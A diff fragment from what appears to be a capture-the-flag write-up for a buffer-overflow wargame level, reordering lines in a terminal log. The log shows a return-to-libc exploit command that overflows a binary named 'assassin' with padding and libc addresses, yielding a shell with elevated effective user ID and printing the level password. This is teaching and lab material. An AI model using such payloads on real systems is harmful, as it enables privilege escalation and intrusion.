@@ -136,11 +136,11 @@ system = 0x40058ae0
 ```
 [giant@localhost giant]$ ./assassin `python -c 'print "A"*44+"\x1e\x85\x04\x08"+"\xe0\x8a\x05\x40"*2+"\xf9\xbf\x0f\x40"'`
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�@�@�@
+bash$ id
+uid=514(giant) gid=514(giant) euid=515(assassin) egid=515(assassin) groups=514(giant)
 bash$ my-pass
 euid = 515
 pushing me away
-bash$ id
-uid=514(giant) gid=514(giant) euid=515(assassin) egid=515(assassin) groups=514(giant)
 ```
 
 
